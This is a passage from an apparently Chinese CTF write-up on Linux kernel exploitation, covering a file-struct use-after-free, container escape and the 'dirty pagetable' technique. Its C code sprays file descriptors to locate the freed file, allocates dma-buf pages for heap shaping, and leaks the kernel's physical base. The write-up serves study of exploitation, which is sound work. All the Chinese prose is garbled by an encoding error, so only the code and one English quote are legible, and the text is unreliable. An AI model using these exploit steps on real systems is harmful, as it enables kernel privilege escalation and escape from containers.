class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä¸å¾—ä¸è¯´è¿™æ‹›ç¡®å®æœ‰ç‚¹ç‰›é€¼çš„è¯´ï¼ˆ</p><p>è¿™é“é¢˜ç›®åœ¨ kernel çš„åŸºç¡€ä¸Šå¥—äº†ä¸€å±‚å®¹å™¨é€ƒé€¸ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æœ€ç»ˆæ˜¯è¦èƒ½å¤Ÿå®ç°ä»»æ„ shellcode æ‰§è¡Œæˆ–è€… æ‰§è¡Œæˆ‘ä»¬çš„ ropï¼Œä½†ç”±äºå‰è€…çš„é™åˆ¶æ›´å°‘ä¸€ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ shellcodeï¼Œè‡ªç„¶è€Œç„¶çš„æˆ‘ä»¬ä¹Ÿä¼šæƒ³åˆ° dirty pageTableè¿™ç§æ‰“æ³•ã€‚è¿™ç§æ‰“æ³•çš„åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ä¿®æ”¹æˆ‘ä»¬åœ¨å‰ç½®å†…å®¹é‡Œé¢æ‰€æåˆ°çš„ PTEï¼Œè¿›è€Œèƒ½å¤Ÿå®ç°å†…æ ¸ä¸Šä»»æ„ç‰©ç†åœ°å€çš„è¯»å†™ã€‚ä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°é—®é¢˜ï¼Œå‡ºé¢˜äººç¼–å†™çš„å†…æ ¸é©±åŠ¨å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬è¯»å†™ uaf å †å—çš„æœºä¼šï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ file ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åœ¨å½“å‰ç‰ˆæœ¬çš„å†…æ ¸å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span><span class="title">f_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">f_rcuhead</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_iocb_flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span><span class="title">f_path</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">f_inode</span>;</span><span class="comment">/* cached value */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment"> * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">spinlock_t</span>f_lock;</span><br><span class="line"><span class="type">atomic_long_t</span>f_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"><span class="type">fmode_t</span>f_mode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">f_pos_lock</span>;</span></span><br><span class="line"><span class="type">loff_t</span>f_pos;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span><span class="title">f_owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">f_cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span><span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">u64f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line"><span class="type">void</span>*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line"><span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="type">errseq_t</span>f_wb_err;</span><br><span class="line"><span class="type">errseq_t</span>f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ file ç»“æ„ä½“å»å ä½ uaf çš„å †å—ï¼Œç„¶åä½¿ç”¨ kfree é‡Šæ”¾è¯¥ file ç»“æ„ä½“å°±ä¼šå‡ºç°ä¸€ä¸ª file uafã€‚ç”±äº file ç»“æ„ä½“æ˜¯ä½¿ç”¨ filp è¿›è¡Œå•ç‹¬ç®¡ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯è¦æƒ³åŠæ³•è®© file uaf å¯¹åº”çš„ slab ç»™ buddy system å›æ”¶ï¼Œè¿™é‡Œæˆ‘é€‰ç”¨çš„æ–¹æ³•ä¾ç„¶æ˜¯å–·å°„å¤§é‡çš„ file ç»“æ„ä½“ç„¶åå…¨éƒ¨é‡Šæ”¾æ¥è§£å†³ã€‚ä¸‹ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•åœ¨ç”¨æˆ·æ€çŸ¥é“å“ªä¸ª file ç»™é‡Šæ”¾äº†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡å–·å°„å¤§é‡åªè¯»æƒé™çš„æ–‡ä»¶</li><li>åˆ©ç”¨ kfree é‡Šæ”¾å…¶ä¸­ä¸€ä¸ª file ç»“æ„ä½“</li><li>ç¬¬äºŒæ¬¡å–·å°„å¤§é‡åªå†™æƒé™çš„æ–‡ä»¶</li><li>å¯¹å‘æ‰€ä»¥ç¬¬ä¸€æ¬¡å–·å°„çš„æ–‡ä»¶å†™å…¥æ•°æ®ï¼Œå¦‚æœèƒ½å¤Ÿå†™å…¥æˆåŠŸåˆ™è¯´æ˜è¯¥æ–‡ä»¶ä¸º uaf çš„æ–‡ä»¶ã€‚</li></ul><p>ä¸Šè¿°è¿‡ç¨‹çš„æµç¨‹å›¾å¤§è‡´å¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸Šè¿°è¿‡ç¨‹çš„ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> read_fd[READ_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">del(uaf_index);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">        uaf_read_fd = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">    close(tmp_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(read_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    close(write_fd[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±èƒ½å¤Ÿè®© PTE æ¥å ä½æˆ‘ä»¬çš„ file uaf çš„å †å—</p><img src="/2024/11/12/fileuaf/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç»™ PTE å ä½å uaf å—åœ¨ gdb è°ƒè¯•çš„ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç° PTE æ‰€æŒ‡å‘ç‰©ç†åœ°å€æ˜¯ä»¥ 0x1000 é€’å¢çš„ï¼Œè¿™æ­£å¥½æ»¡è¶³ä¸€ä¸ªé¡µçš„å¤§å°ã€‚</p><p>ç„¶è€Œç”±äº file ç»“æ„ä½“ç»™é‡Šæ”¾äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹è¯¥ file è¿›è¡Œå…¶ä»–æ“ä½œåŸºæœ¬éƒ½ä¼šå¯¼è‡´ kernel panicï¼Œå¯æ˜¯ dup ä¾ç„¶å¯ç”¨ã€‚é€šè¿‡çœ‹ file ç»“æ„ä½“çš„æºç æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸ªå« f_count çš„å˜é‡åœ¨ file + 0x38 çš„ä½ç½®ï¼Œf_countè¡¨ç¤ºæ–‡ä»¶å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œå½“æˆ‘ä»¬è°ƒç”¨dupç³»ç»Ÿè°ƒç”¨å¤åˆ¶æ–‡ä»¶æè¿°ç¬¦æ—¶å®ƒå°†é€’å¢ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è·å¾—ä¸€ä¸ªåŸè¯­æ¥é€’å¢ PTE ä¸­çš„æŒ‡é’ˆã€‚ç„¶è€Œæ­£å¸¸æƒ…å†µä¸‹ä¸€ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥æ‹¥æœ‰ 0x400 ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬æ— æ³• dup å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ fork æ¥å®ç°å¤šæ¬¡ dupã€‚åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ startjail.sh ä¸­æœ‰æ¡å‘½ä»¤ï¼šulimit -Hn 33000ï¼Œè¿™è¡¨ç¤ºæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æœ€å¤šæ‹¥æœ‰ 33000 ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬å¯¹ file uaf çš„åˆ©ç”¨ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å¯¹ uaf_file dup 0x1000 æ¬¡ï¼Œè¿™æ—¶å°±ä¼šå‡ºç°ç‰©ç†åœ°å€çš„é‡å ï¼š</p><img src="/2024/11/12/fileuaf/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åˆ©ç”¨ dup å‡½æ•°ä»¤ PTE çš„æ¡ç›®é€’å¢ 0x1000:</p><img src="/2024/11/12/fileuaf/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ä¸¤ä¸ª PTE æ¡ç›®æŒ‡å‘äº†åŒä¸€ä¸ªç‰©ç†åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†ä½¿ç”¨ munmap é‡Šæ”¾æ‰æˆ‘ä»¬é‡å çš„ PTE å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ„é€ å‡ºç‰©ç†å†…å­˜ä¸Šçš„ page uafã€‚æœ‰äº†page uaf åæˆ‘ä»¬ç¬¬ä¸€æ—¶é—´å¯èƒ½ä¼šæƒ³åˆ°ç”¨ç”¨æˆ·é¡µè¡¨å æ®é‡Šæ”¾é¡µï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶ç”¨æˆ·é¡µè¡¨ï¼Œç„¶è€Œè¿™æ˜¯ä¸å¤ªç°å®çš„ã€‚åŒ¿åÂ mmap()Â åˆ†é…çš„ç‰©ç†é¡µæ¥è‡ªå†…å­˜åŒºçš„MIGRATE_MOVABLEÂ free_areaï¼Œè€Œç”¨æˆ·é¡µè¡¨æ˜¯ä»å†…å­˜åŒºçš„ MIGRATE_UNMOVABLEÂ free_area åˆ†é…ï¼Œæ‰€ä»¥å¾ˆéš¾é€šè¿‡é€’å¢ PTE ä½¿ä¹‹æŒ‡å‘å¦ä¸€ç”¨æˆ·é¡µè¡¨ã€‚è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å¦å¤–ä¸€ç§æ–¹å¼æ¥åˆ†é…ç‰©ç†é¡µï¼Œä½¿è¯¥ç‰©ç†é¡µå’Œç”¨æˆ·é¡µè¡¨æ¥è‡ªåŒä¸€å†…å­˜åŒºåŸŸï¼Œè¿™æ ·å¦‚æœå—å®³è€…PTEæŒ‡å‘è¯¥ç‰©ç†é¡µï¼Œå°±èƒ½é€šè¿‡é€’å¢è¯¥PTEï¼Œä½¿è¯¥PTEæŒ‡å‘æŸä¸ªç”¨æˆ·é¡µè¡¨ã€‚</p><p>ä¸‹é¢çš„æ“ä½œæ¥è‡ª dirty pageTable çš„æ–‡ç« <a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a>ï¼š</p><hr><p>ä½œè€…é€‰ç”¨ dma-buf ç³»ç»Ÿå †æ¥åˆ†é…å…±äº«é¡µï¼Œå› ä¸ºå¯ä»¥ä» Android ä¸­ä¸å—ä¿¡ä»»çš„ APP æ¥è®¿é—® &#x2F;dev&#x2F;dma_heap&#x2F;systemï¼Œå¹¶ä¸” dma-buf çš„å®ç°ç›¸å¯¹ç®€å•ã€‚é€šè¿‡Â open(&#x2F;dev&#x2F;dma_heap&#x2F;system)Â å¯è·å¾—ä¸€ä¸ª dma heap fdï¼Œç„¶åç”¨ä»¥ä¸‹ä»£ç åˆ†é…ä¸€ä¸ªå…±äº«é¡µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure><p>ç”±ç”¨æˆ·ç©ºé—´ä¸­çš„Â dma_buf_fd æ¥è¡¨ç¤ºä¸€ä¸ªå…±äº«é¡µï¼Œå¯é€šè¿‡ mmap()Â dma_buf_fd å°†å…±äº«é¡µæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚ä» dma-buf ç³»ç»Ÿå †åˆ†é…çš„å…±äº«é¡µæœ¬è´¨ä¸Šæ˜¯ä»é¡µåˆ†é…å™¨åˆ†é…çš„ï¼ˆå®é™…ä¸Š dma-buf å­ç³»ç»Ÿé‡‡ç”¨äº†é¡µé¢æ± è¿›è¡Œä¼˜åŒ–ï¼Œå¯¹äºæœ¬åˆ©ç”¨æ²¡æœ‰å½±å“ï¼‰ã€‚ç”¨äºåˆ†é…å…±äº«é¡µçš„Â gfp_flagsÂ å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ <span class="comment">// HIGH_ORDER_GFP ç”¨äº order-8å’Œorder-4 page</span></span></span><br><span class="line">                | __GFP_NORETRY) &amp; ~__GFP_RECLAIM) \</span><br><span class="line">                | __GFP_COMP)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) <span class="comment">// LOW_ORDER_GFP ç”¨äº order-0 page</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">gfp_t</span> order_flags[] = &#123;HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP&#125;;</span><br></pre></td></tr></table></figure><p>å…±äº«é¡µåˆ†é… vs é¡µè¡¨åˆ†é…ï¼šä» LOW_ORDER_GFP å¯ä»¥çœ‹å‡ºï¼Œå•ä¸ªå…±äº«é¡µæ˜¯ä»å†…å­˜çš„ MIGRATE_UNMOVABLEÂ free_area ä¸­åˆ†é…çš„ï¼Œå’Œé¡µè¡¨åˆ†é…çš„å‡ºå¤„ä¸€æ ·ã€‚ä¸”å•ä¸ªå…±äº«é¡µä¸º order-1 ï¼ˆorder-0 ?ï¼‰ï¼Œå’Œé¡µè¡¨çš„ order ç›¸åŒã€‚ç»“è®ºæ˜¯ï¼Œå•ä¸ªå…±äº«é¡µå’Œé¡µè¡¨éƒ½æ˜¯ä»åŒä¸€ migrateÂ free_cache ä¸­åˆ†é…ï¼Œä¸” order ç›¸åŒã€‚</p><img src="/2024/11/12/fileuaf/10.svg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯è§ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸­ï¼Œå•ä¸ªå…±äº«é¡µå’Œç”¨æˆ·é¡µè¡¨åˆ†å¸ƒå¾—æ¯”è¾ƒç´§å‡‘ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æˆåŠŸå¯¹å…±äº«é¡µå’Œç”¨æˆ·é¡µè¡¨è¿›è¡Œäº† heap shapingã€‚</p><hr><p>æ€»çš„æ¥è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ dma-buf æ¥è¾…åŠ©æˆ‘ä»¬è®©ç‰©ç†åœ°å€ page uaf çš„å †å—ç»™ DMA-buf heap ç»™å ä½ï¼Œè€Œè¯¥ heap åœ¨ç‰©ç†åœ°å€ä¸Šä¸å¦å¤–ä¸€ä¸ª PTE ç›¸é‚»ï¼Œæ­¤æ—¶æˆ‘ä»¬å³å¯å†æ¬¡åˆ©ç”¨ file uaf æ¥ä»¤ victim PTE æŒ‡å‘ PTE å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œè¿›è€Œèƒ½å¤Ÿä»»æ„ä¿®æ”¹ PTE çš„æ¡ç›®æ¥å®ç°ç‰©ç†åœ°å€ä¸Šçš„è¯»å†™ï¼Œå…¶å¸ƒç½®å¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åˆ©ç”¨ file uaf å†æ¬¡ dup 0x1000 åï¼Œä¿®æ”¹ PTE çš„æ¡ç›®ï¼š</p><img src="/2024/11/12/fileuaf/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥æˆ‘ä»¬å·²ç»æ‹¥æœ‰ä¿®æ”¹ PTE çš„èƒ½åŠ›ï¼Œé‚£æˆ‘ä»¬è‚¯å®šè¦å…ˆè·å– kernel ä»£ç æ®µçš„åŸºå€æ‰èƒ½å¤Ÿå¯¹ä»£ç æ®µè¿›è¡Œå†™æ“ä½œï¼Œè¿™ä¸ªåœ°æ–¹çš„æ“ä½œæ¯”è¾ƒç‰›é€¼ï¼Œè¿™é‡Œå¼•ç”¨<a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFã™ã‚‹ã (hatenablog.com)</a>ï¼š</p><hr><p>Although itâ€™s already 2024, we can find some fixed physical addresses on bothÂ LinuxÂ andÂ Windows.</p><img src="/2024/11/12/fileuaf/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>The pages around here is always fixed, and data for page table is left. (Credit toÂ shift_cropsÂ who found it during HITCON.) The page table has a pointer to kernel-land physical address, which is useful for leaking the physical base address of the kernel.</p><hr><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¿™ä¸ªå›ºå®šçš„ç‰©ç†åœ°å€ä¸Šè·å–æŸä¸ªå†…æ ¸ä»£ç æ®µçš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Leak kernel physical base</span></span><br><span class="line"><span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">*(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">        wwwbuf = page_spray[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ‰¾åˆ°è¯¥åœ°å€ä¸å†…æ ¸ç‰©ç†åŸºå€çš„åç§»ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæŠ€å·§ï¼Œå½“æˆ‘ä»¬å…³é—­äº† kaslr æ—¶å†…æ ¸çš„ç‰©ç†åŸºå€ä¼šå›ºå®šä¸º 0x1000000ï¼Œæˆ‘ä»¬å¯ä»¥å…³é—­ kaslr åå†è¿›è¡Œå¯¹åç§»çš„è®¡ç®—ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ qemu monitor ä¸­è¿›è¡ŒéªŒè¯ã€‚</p><img src="/2024/11/12/fileuaf/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯æ˜¯å¼€å¯äº† kaslr åè¿™ä¸ªåç§»ä¼šæœ‰ä¸€ç‚¹ç‚¹æ”¹å˜ :( ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåœ¨å¼€å¯ kalsr æ—¶è°ƒè¯•æ”¹æ”¹å°±è¡Œã€‚</p><p>è¿™é‡Œå…¶å®è¿˜å¯ä»¥ä½¿ç”¨ gef å‡çº§ç‰ˆæœ¬æ¥ç›´æ¥è¿›è¡Œç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼ˆç¬”è€…è§‰å¾—è¿™ä¸ªåŠŸèƒ½çœŸçš„å¥½ç‰›é€¼ï¼‰ï¼Œç›¸å…³å‘½ä»¤ä¸º p2vã€v2p  </p><img src="/2024/11/12/fileuaf/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>é¡¹ç›®åœ°å€ä¸ºï¼š<a href="https://github.com/bata24/gef">https://github.com/bata24/gef</a>  </p><p>è·å¾—å†…æ 